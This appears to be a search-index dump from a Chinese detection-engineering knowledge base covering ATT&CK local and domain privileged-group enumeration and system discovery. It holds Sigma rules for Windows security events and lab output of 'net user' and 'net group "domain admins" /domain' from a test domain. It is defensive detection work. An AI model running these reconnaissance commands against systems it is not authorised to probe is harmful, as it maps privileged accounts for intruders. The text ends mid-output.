\u68c0\u6d4b\u672c\u5730\u679a\u4e3e\u7528\u6237\u7ec4\u884c\u4e3a description: windows server 2016 references: tags: T1069-001 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: - 4798 #\u5df2\u679a\u4e3e\u7528\u6237\u7684\u672c\u5730\u7ec4\u6210\u5458\u8eab\u4efd\u3002\u6d4b\u8bd5\u547d\u4ee4\uff1anet user - 4799 #\u5df2\u679a\u4e3e\u542f\u7528\u4e86\u5b89\u5168\u673a\u5236\u7684\u672c\u5730\u7ec4\u6210\u5458\u8eab\u4efd\u3002 \u6d4b\u8bd5\u547d\u4ee4\uff1anet localgroup administrators Processname: 'C:\\Windows\\System32\\net1.exe' #\u8fdb\u7a0b\u4fe1\u606f\uff1a\u8fdb\u7a0b\u540d\u79f0 condition: selection level: medium title: \u653b\u51fb\u8005\u8fdb\u884c\u672c\u5730\u4fe1\u606f\u6536\u96c6\uff0c\u6267\u884cwhoami\u547d\u4ee4\u4ee5\u53canet user \u547d\u4ee4 description: windows server 2012 status: experimental logsource: product: windows service: security detection: selection1: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b Newprocessname: '*\\whoami.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0 Processcommandline: whoami #\u8fdb\u7a0b\u547d\u4ee4\u884c selection2: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b Newprocessname: '*\\net.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0 Processcommandline: net user #\u8fdb\u7a0b\u547d\u4ee4\u884c selection3: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b Newprocessname: '*\\net1.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0 Processcommandline: '*\\net1 user' #\u8fdb\u7a0b\u547d\u4ee4\u884c condition: selection1 or (selection2 and selection3) level: medium \u5efa\u8bae \u6682\u65e0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1069-001 https://attack.mitre.org/techniques/T1069/001/ MITRE-ATT&CK-T1087 https://attack.mitre.org/techniques/T1087/","title":"T1069-001-win-AD\u7279\u6743\u7ec4/\u7528\u6237\u679a\u4e3e"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#t1069-001-win-ad","text":"","title":"T1069-001-win-AD\u7279\u6743\u7ec4/\u7528\u6237\u679a\u4e3e"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u67e5\u627e\u672c\u5730\u7cfb\u7edf\u7ec4\u548c\u6743\u9650\u8bbe\u7f6e\u3002\u672c\u5730\u7cfb\u7edf\u6743\u9650\u7ec4\u7684\u77e5\u8bc6\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u786e\u5b9a\u5b58\u5728\u54ea\u4e9b\u7ec4\u4ee5\u53ca\u54ea\u4e9b\u7528\u6237\u5c5e\u4e8e\u7279\u5b9a\u7ec4\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u6b64\u4fe1\u606f\u6765\u786e\u5b9a\u54ea\u4e9b\u7528\u6237\u5177\u6709\u8f83\u9ad8\u7684\u6743\u9650\uff0c\u4f8b\u5982\u5728\u672c\u5730\u7ba1\u7406\u5458\u7ec4\u4e2d\u627e\u5230\u7684\u7528\u6237\u3002 Net\u5b9e\u7528\u7a0b\u5e8f\uff0cmacOS\u548cLinux\u4e0a\u7684\u8bf8\u5982Net\u5b9e\u7528\u7a0b\u5e8fnet localgroup\u4e4b\u7c7b\u7684\u547d\u4ee4\u90fd\u53ef\u4ee5\u5217\u51fa\u672c\u5730\u7ec4\u3002dscl . -list /Groupsgroups","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_1","text":"\u5728\u4fa6\u5bdf\u9636\u6bb5\u68c0\u6d4b\u5230\u653b\u51fb\u8005\u975e\u5e38\u91cd\u8981\uff0c\u56e0\u4e3a\u5982\u679c\u653b\u51fb\u8005\u6b63\u5904\u4e8e\u6b64\u9636\u6bb5\uff0c\u5219\u610f\u5473\u7740\u5df2\u7ecf\u7ed5\u8fc7\u4e86\u6240\u6709\u5916\u56f4\u8bbe\u5907\u548c\u5b89\u5168\u9632\u62a4\u9636\u6bb5\u3002Microsoft Net.exe\u7a0b\u5e8f\u53ef\u7528\u4e8e\u679a\u4e3e\u672c\u5730\u548c\u57df\u7528\u6237\u548c\u7ec4\u3002\u5bf9\u4e8e\u4efb\u4f55\u8bd5\u56fe\u83b7\u53d6\u8c01/\u4f55\u5904\u7b49\u7b49\u7b54\u6848\u7684\u653b\u51fb\u8005\uff0c\u8fd9\u90fd\u662f\u5fc5\u987b\u8981\u505a\u7684\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7Net\u547d\u4ee4\u679a\u4e3e\u57df\u548c\u672c\u5730\u7528\u6237\u8d26\u6237\u53ca\u7ba1\u7406\u7ec4\u7b49\u4fe1\u606f\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_2","text":"windows\u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_3","text":"windows DOS\u547d\u4ee4\uff1anet user / net localgroup administrators","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_4","text":"windwos \u5b89\u5168\u65e5\u5fd7 4799/4798(\u6ce8\u610f\uff1a\u6b64\u4e8b\u4ef6\u65e5\u5fd7\u4ec5\u9650\u4e8ewindows server 2016/win10\u4ee5\u4e0a\u7248\u672c)","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#sigma","text":"title: \u68c0\u6d4b\u672c\u5730\u679a\u4e3e\u7528\u6237\u7ec4\u884c\u4e3a description: windows server 2016 references: tags: T1069-001 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: - 4798 #\u5df2\u679a\u4e3e\u7528\u6237\u7684\u672c\u5730\u7ec4\u6210\u5458\u8eab\u4efd\u3002\u6d4b\u8bd5\u547d\u4ee4\uff1anet user - 4799 #\u5df2\u679a\u4e3e\u542f\u7528\u4e86\u5b89\u5168\u673a\u5236\u7684\u672c\u5730\u7ec4\u6210\u5458\u8eab\u4efd\u3002 \u6d4b\u8bd5\u547d\u4ee4\uff1anet localgroup administrators Processname: 'C:\\Windows\\System32\\net1.exe' #\u8fdb\u7a0b\u4fe1\u606f\uff1a\u8fdb\u7a0b\u540d\u79f0 condition: selection level: medium title: \u653b\u51fb\u8005\u8fdb\u884c\u672c\u5730\u4fe1\u606f\u6536\u96c6\uff0c\u6267\u884cwhoami\u547d\u4ee4\u4ee5\u53canet user \u547d\u4ee4 description: windows server 2012 status: experimental logsource: product: windows service: security detection: selection1: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b Newprocessname: '*\\whoami.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0 Processcommandline: whoami #\u8fdb\u7a0b\u547d\u4ee4\u884c selection2: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b Newprocessname: '*\\net.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0 Processcommandline: net user #\u8fdb\u7a0b\u547d\u4ee4\u884c selection3: EventID: 4688 #\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b Newprocessname: '*\\net1.exe' #\u65b0\u8fdb\u7a0b\u540d\u79f0 Processcommandline: '*\\net1 user' #\u8fdb\u7a0b\u547d\u4ee4\u884c condition: selection1 or (selection2 and selection3) level: medium","title":"sigma\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_6","text":"\u6682\u65e0","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-001-win-%E6%9C%AC%E5%9C%B0%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_7","text":"MITRE-ATT&CK-T1069-001 https://attack.mitre.org/techniques/T1069/001/ MITRE-ATT&CK-T1087 https://attack.mitre.org/techniques/T1087/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/","text":"T1069-002-AD\u7279\u6743\u7ec4/\u7528\u6237\u679a\u4e3e \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u67e5\u627e\u57df\u7ea7\u522b\u7684\u7ec4\u548c\u6743\u9650\u8bbe\u7f6e\u3002\u57df\u7ea7\u522b\u6743\u9650\u7ec4\u7684\u77e5\u8bc6\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u786e\u5b9a\u5b58\u5728\u54ea\u4e9b\u7ec4\u4ee5\u53ca\u54ea\u4e9b\u7528\u6237\u5c5e\u4e8e\u7279\u5b9a\u7ec4\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u6b64\u4fe1\u606f\u6765\u786e\u5b9a\u54ea\u4e9b\u7528\u6237\u5177\u6709\u63d0\u5347\u7684\u6743\u9650\uff0c\u4f8b\u5982\u57df\u7ba1\u7406\u5458\u3002 Net\u5b9e\u7528\u7a0b\u5e8f\uff0cmacOS\u548cLinux\u4e0a\u7684\u8bf8\u5982Net\u5b9e\u7528\u7a0b\u5e8fnet group /domain\u4e4b\u7c7b\u7684\u547d\u4ee4\u90fd\u53ef\u4ee5\u5217\u51fa\u57df\u7ea7\u522b\u7684\u7ec4\u3002dscacheutil -q groupldapsearch \u6d4b\u8bd5\u6848\u4f8b \u5728\u4fa6\u5bdf\u9636\u6bb5\u68c0\u6d4b\u5230\u653b\u51fb\u8005\u975e\u5e38\u91cd\u8981\uff0c\u56e0\u4e3a\u5982\u679c\u653b\u51fb\u8005\u6b63\u5904\u4e8e\u6b64\u9636\u6bb5\uff0c\u5219\u610f\u5473\u7740\u5df2\u7ecf\u7ed5\u8fc7\u4e86\u6240\u6709\u5916\u56f4\u8bbe\u5907\u548c\u5b89\u5168\u9632\u62a4\u9636\u6bb5\u3002Microsoft Net.exe\u7a0b\u5e8f\u53ef\u7528\u4e8e\u679a\u4e3e\u672c\u5730\u548c\u57df\u7528\u6237\u548c\u7ec4\u3002\u5bf9\u4e8e\u4efb\u4f55\u8bd5\u56fe\u83b7\u53d6\u8c01/\u4f55\u5904\u7b49\u7b49\u7b54\u6848\u7684\u653b\u51fb\u8005\uff0c\u8fd9\u90fd\u662f\u5fc5\u987b\u8981\u505a\u7684\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7Net\u547d\u4ee4\u679a\u4e3e\u57df\u548c\u672c\u5730\u7528\u6237\u8d26\u6237\u53ca\u7ba1\u7406\u7ec4\u7b49\u4fe1\u606f\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7\uff08\u4ee5\u4e0b\u573a\u666f\u68c0\u6d4b\u65e5\u5fd7\u9700\u8981\u4ece\u57df\u63a7\u4e3b\u673a\u63d0\u53d6\u3002\u5176\u4ed6\u4e3b\u673a\u65e0\u6b64\u65e5\u5fd7\u4ea7\u751f\uff09 \u6d4b\u8bd5\u590d\u73b0 \u573a\u666f\u4e00\uff1a\u57df\u5185\u4e3b\u673a\u6267\u884cnet user administrator /domain C:\\Users\\sqladmin>net user administrator /domain \u8fd9\u9879\u8bf7\u6c42\u5c06\u5728\u57df 0day.org \u7684\u57df\u63a7\u5236\u5668\u5904\u7406\u3002 \u7528\u6237\u540d Administrator \u5168\u540d Administrator \u6ce8\u91ca \u7ba1\u7406\u8ba1\u7b97\u673a(\u57df)\u7684\u5185\u7f6e\u5e10\u6237 \u7528\u6237\u7684\u6ce8\u91ca \u56fd\u5bb6/\u5730\u533a\u4ee3\u7801 000 (\u7cfb\u7edf\u9ed8\u8ba4\u503c) \u5e10\u6237\u542f\u7528 Yes \u5e10\u6237\u5230\u671f \u4ece\u4e0d \u4e0a\u6b21\u8bbe\u7f6e\u5bc6\u7801 2019/9/17 18:01:24 \u5bc6\u7801\u5230\u671f 2019/10/29 18:01:24 \u5bc6\u7801\u53ef\u66f4\u6539 2019/9/18 18:01:24 \u9700\u8981\u5bc6\u7801 Yes \u7528\u6237\u53ef\u4ee5\u66f4\u6539\u5bc6\u7801 Yes \u5141\u8bb8\u7684\u5de5\u4f5c\u7ad9 All \u767b\u5f55\u811a\u672c \u7528\u6237\u914d\u7f6e\u6587\u4ef6 \u4e3b\u76ee\u5f55 \u4e0a\u6b21\u767b\u5f55 2019/10/17 14:19:03 \u53ef\u5141\u8bb8\u7684\u767b\u5f55\u5c0f\u65f6\u6570 All \u672c\u5730\u7ec4\u6210\u5458 *Administrators \u5168\u5c40\u7ec4\u6210\u5458 *Organization Manageme*Domain Users *Enterprise Admins *Schema Admins *Group Policy Creator *Domain Admins \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 \u573a\u666f\u4e8c\uff1a\u57df\u5185\u4e3b\u673a\u6267\u884cnet group \"domain admins\" /domain C:\\Users\\sqladmin>net group \"domain admins\" /domain \u8fd9\u9879\u8bf7\u6c42\u5c06\u5728\u57df 0day.org \u7684\u57df\u63a7\u5236\u5668\u5904\u7406\u3002 \u7ec4\u540d Domain Admins \u6ce8\u91ca \u6307\u5b9a\u7684\u57df\u7ba1\u7406\u5458 \u6210\u5458 ------------------------------------------------------------------------------- Administrator antivirus backup secretary sqladmin websvr \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 \u6d4b\u8bd5\u7559\u75d5 windows\u5b89\u5168\u4e8b\u4ef6ID\uff0c4661\uff08\u5df2\u8bf7\u6c42\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\uff09\uff0c\u5bf9\u8c61\u7c7b\u578b\u3001\u8fdb\u7a0b\u4fe1\u606f\u7b49\u3002 \u68c0\u6d4b\u89c4\u5219/\u601d\u8def sigma\u89c4\u5219 title: AD\u57df\u6743\u9650\u7ec4\u53ca\u7528\u6237\u679a\u4e3e description: win7\u6d4b\u8bd5\uff0cwindows service 2008\uff08\u57df\u63a7\uff09 references: http://www.polaris-lab.com/index.php/archives/42/ tags: T1069-002 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4661 # \u5df2\u8bf7\u6c42\u5230\u5bf9\u8c61\u7684\u53e5\u67c4 Objecttype: #\u5bf9\u8c61>\u5bf9\u8c61\u7c7b\u578b - SAM_USER - SAM_GROUP Objectname: #\u5bf9\u8c61>\u5bf9\u8c61\u540d - 'S-1-5-21-*-*-*-502' - 'S-1-5-21-*-*-*-512' - 'S-1-5-21-*-*-*-500' - 'S-1-5-21-*-*-*-505' - 'S-1-5-21-*-*-*-519' - 'S-1-5-21-*-*-*-520' - 'S-1-5-21-*-*-*-544' - 'S-1-5-21-*-*-*-551' - 'S-1-5-21-*-*-*-555' Processname: 'C:\\Windows\\System32\\lsass.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d\u79f0 condition: selection level: medium \u5efa\u8bae \u58f0\u660e\uff1a \u4ec5\u6d4b\u8bd5\u4ee5\u4e0b\u547d\u4ee4\uff1anet user administrator /domain\u3001net group \"domain admins\" /domain \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1087\uff1a https://attack.mitre.org/techniques/T1087/ MITRE-ATT&CK-T1069-002\uff1a https://attack.mitre.org/techniques/T1069/002 \u5185\u7f51\u6e17\u900f\u5b9a\u4f4d\u6280\u672f\u603b\u7ed3\uff1a http://www.polaris-lab.com/index.php/archives/42/","title":"T1069-002-AD\u7279\u6743\u7ec4/\u7528\u6237\u679a\u4e3e"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#t1069-002-ad","text":"","title":"T1069-002-AD\u7279\u6743\u7ec4/\u7528\u6237\u679a\u4e3e"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#attck","text":"\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u5c1d\u8bd5\u67e5\u627e\u57df\u7ea7\u522b\u7684\u7ec4\u548c\u6743\u9650\u8bbe\u7f6e\u3002\u57df\u7ea7\u522b\u6743\u9650\u7ec4\u7684\u77e5\u8bc6\u53ef\u4ee5\u5e2e\u52a9\u653b\u51fb\u8005\u786e\u5b9a\u5b58\u5728\u54ea\u4e9b\u7ec4\u4ee5\u53ca\u54ea\u4e9b\u7528\u6237\u5c5e\u4e8e\u7279\u5b9a\u7ec4\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u6b64\u4fe1\u606f\u6765\u786e\u5b9a\u54ea\u4e9b\u7528\u6237\u5177\u6709\u63d0\u5347\u7684\u6743\u9650\uff0c\u4f8b\u5982\u57df\u7ba1\u7406\u5458\u3002 Net\u5b9e\u7528\u7a0b\u5e8f\uff0cmacOS\u548cLinux\u4e0a\u7684\u8bf8\u5982Net\u5b9e\u7528\u7a0b\u5e8fnet group /domain\u4e4b\u7c7b\u7684\u547d\u4ee4\u90fd\u53ef\u4ee5\u5217\u51fa\u57df\u7ea7\u522b\u7684\u7ec4\u3002dscacheutil -q groupldapsearch","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_1","text":"\u5728\u4fa6\u5bdf\u9636\u6bb5\u68c0\u6d4b\u5230\u653b\u51fb\u8005\u975e\u5e38\u91cd\u8981\uff0c\u56e0\u4e3a\u5982\u679c\u653b\u51fb\u8005\u6b63\u5904\u4e8e\u6b64\u9636\u6bb5\uff0c\u5219\u610f\u5473\u7740\u5df2\u7ecf\u7ed5\u8fc7\u4e86\u6240\u6709\u5916\u56f4\u8bbe\u5907\u548c\u5b89\u5168\u9632\u62a4\u9636\u6bb5\u3002Microsoft Net.exe\u7a0b\u5e8f\u53ef\u7528\u4e8e\u679a\u4e3e\u672c\u5730\u548c\u57df\u7528\u6237\u548c\u7ec4\u3002\u5bf9\u4e8e\u4efb\u4f55\u8bd5\u56fe\u83b7\u53d6\u8c01/\u4f55\u5904\u7b49\u7b49\u7b54\u6848\u7684\u653b\u51fb\u8005\uff0c\u8fd9\u90fd\u662f\u5fc5\u987b\u8981\u505a\u7684\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7Net\u547d\u4ee4\u679a\u4e3e\u57df\u548c\u672c\u5730\u7528\u6237\u8d26\u6237\u53ca\u7ba1\u7406\u7ec4\u7b49\u4fe1\u606f\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7\uff08\u4ee5\u4e0b\u573a\u666f\u68c0\u6d4b\u65e5\u5fd7\u9700\u8981\u4ece\u57df\u63a7\u4e3b\u673a\u63d0\u53d6\u3002\u5176\u4ed6\u4e3b\u673a\u65e0\u6b64\u65e5\u5fd7\u4ea7\u751f\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#net-user-administrator-domain","text":"C:\\Users\\sqladmin>net user administrator /domain \u8fd9\u9879\u8bf7\u6c42\u5c06\u5728\u57df 0day.org \u7684\u57df\u63a7\u5236\u5668\u5904\u7406\u3002 \u7528\u6237\u540d Administrator \u5168\u540d Administrator \u6ce8\u91ca \u7ba1\u7406\u8ba1\u7b97\u673a(\u57df)\u7684\u5185\u7f6e\u5e10\u6237 \u7528\u6237\u7684\u6ce8\u91ca \u56fd\u5bb6/\u5730\u533a\u4ee3\u7801 000 (\u7cfb\u7edf\u9ed8\u8ba4\u503c) \u5e10\u6237\u542f\u7528 Yes \u5e10\u6237\u5230\u671f \u4ece\u4e0d \u4e0a\u6b21\u8bbe\u7f6e\u5bc6\u7801 2019/9/17 18:01:24 \u5bc6\u7801\u5230\u671f 2019/10/29 18:01:24 \u5bc6\u7801\u53ef\u66f4\u6539 2019/9/18 18:01:24 \u9700\u8981\u5bc6\u7801 Yes \u7528\u6237\u53ef\u4ee5\u66f4\u6539\u5bc6\u7801 Yes \u5141\u8bb8\u7684\u5de5\u4f5c\u7ad9 All \u767b\u5f55\u811a\u672c \u7528\u6237\u914d\u7f6e\u6587\u4ef6 \u4e3b\u76ee\u5f55 \u4e0a\u6b21\u767b\u5f55 2019/10/17 14:19:03 \u53ef\u5141\u8bb8\u7684\u767b\u5f55\u5c0f\u65f6\u6570 All \u672c\u5730\u7ec4\u6210\u5458 *Administrators \u5168\u5c40\u7ec4\u6210\u5458 *Organization Manageme*Domain Users *Enterprise Admins *Schema Admins *Group Policy Creator *Domain Admins \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002","title":"\u573a\u666f\u4e00\uff1a\u57df\u5185\u4e3b\u673a\u6267\u884cnet user administrator /domain"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#net-group-domain-admins-domain","text":"C:\\Users\\sqladmin>net group \"domain admins\" /domain \u8fd9\u9879\u8bf7\u6c42\u5c06\u5728\u57df 0day.org \u7684\u57df\u63a7\u5236\u5668\u5904\u7406\u3002 \u7ec4\u540d Domain Admins \u6ce8\u91ca \u6307\u5b9a\u7684\u57df\u7ba1\u7406\u5458 \u6210\u5458 ------------------------------------------------------------------------------- Administrator antivirus backup secretary sqladmin websvr \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002","title":"\u573a\u666f\u4e8c\uff1a\u57df\u5185\u4e3b\u673a\u6267\u884cnet group \"domain admins\" /domain"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_4","text":"windows\u5b89\u5168\u4e8b\u4ef6ID\uff0c4661\uff08\u5df2\u8bf7\u6c42\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\uff09\uff0c\u5bf9\u8c61\u7c7b\u578b\u3001\u8fdb\u7a0b\u4fe1\u606f\u7b49\u3002","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_5","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#sigma","text":"title: AD\u57df\u6743\u9650\u7ec4\u53ca\u7528\u6237\u679a\u4e3e description: win7\u6d4b\u8bd5\uff0cwindows service 2008\uff08\u57df\u63a7\uff09 references: http://www.polaris-lab.com/index.php/archives/42/ tags: T1069-002 status: experimental author: 12306Bro logsource: product: windows service: security detection: selection: EventID: 4661 # \u5df2\u8bf7\u6c42\u5230\u5bf9\u8c61\u7684\u53e5\u67c4 Objecttype: #\u5bf9\u8c61>\u5bf9\u8c61\u7c7b\u578b - SAM_USER - SAM_GROUP Objectname: #\u5bf9\u8c61>\u5bf9\u8c61\u540d - 'S-1-5-21-*-*-*-502' - 'S-1-5-21-*-*-*-512' - 'S-1-5-21-*-*-*-500' - 'S-1-5-21-*-*-*-505' - 'S-1-5-21-*-*-*-519' - 'S-1-5-21-*-*-*-520' - 'S-1-5-21-*-*-*-544' - 'S-1-5-21-*-*-*-551' - 'S-1-5-21-*-*-*-555' Processname: 'C:\\Windows\\System32\\lsass.exe' #\u8fdb\u7a0b\u4fe1\u606f>\u8fdb\u7a0b\u540d\u79f0 condition: selection level: medium","title":"sigma\u89c4\u5219"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_6","text":"\u58f0\u660e\uff1a \u4ec5\u6d4b\u8bd5\u4ee5\u4e0b\u547d\u4ee4\uff1anet user administrator /domain\u3001net group \"domain admins\" /domain","title":"\u5efa\u8bae"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1069-002-win-AD%E7%89%B9%E6%9D%83%E7%BB%84%E7%94%A8%E6%88%B7%E6%9E%9A%E4%B8%BE/#_7","text":"MITRE-ATT&CK-T1087\uff1a https://attack.mitre.org/techniques/T1087/ MITRE-ATT&CK-T1069-002\uff1a https://attack.mitre.org/techniques/T1069/002 \u5185\u7f51\u6e17\u900f\u5b9a\u4f4d\u6280\u672f\u603b\u7ed3\uff1a http://www.polaris-lab.com/index.php/archives/42/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x9_%E5%8F%91%E7%8E%B0/T1082-win-%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E5%8F%91%E7%8E%B0/","text":"T1082-win-\u7cfb\u7edf\u4fe1\u606f\u53d1\u73b0 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u80fd\u8bd5\u56fe\u83b7\u53d6\u6709\u5173\u64cd\u4f5c\u7cfb\u7edf\u548c\u786c\u4ef6\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u7248\u672c\uff0c\u8865\u4e01\uff0c\u4fee\u8865\u7a0b\u5e8f\uff0c\u670d\u52a1\u5305\u548c\u76ee\u5f55\u7ed3\u6784\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u53d1\u73b0\u8fc7\u7a0b\u4e2d\u4f7f\u7528\u7cfb\u7edf\u4fe1\u606f\u4e2d\u53d1\u73b0\u7684\u4fe1\u606f\u6765\u51b3\u5b9a\u540e\u7eed\u7684\u64cd\u4f5c\uff0c\u5305\u62ec\u653b\u51fb\u8005\u662f\u5426\u5b8c\u5168\u611f\u67d3\u4e86\u76ee\u6807\u6216\u5c1d\u8bd5\u4e86\u7279\u5b9a\u64cd\u4f5c\u3002 \u6d4b\u8bd5\u6848\u4f8b windows \u83b7\u5f97\u6b64\u4fe1\u606f\u4f8b\u5982\u547d\u4ee4\u548c\u5b9e\u7528\u7a0b\u5e8f\u5305\u62ecver\uff0cSYSTEMINFO\uff0c\u548cdir\u7b49\u7528\u4e8e\u57fa\u4e8e\u672c\u6587\u4ef6\u548c\u76ee\u5f55\u7684\u4fe1\u606f\u3002 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 windows\u4e0b\u6d4b\u8bd5systeminfo\u547d\u4ee4 Microsoft Windows [\u7248\u672c 6.3.9600] (c) 2013 Microsoft 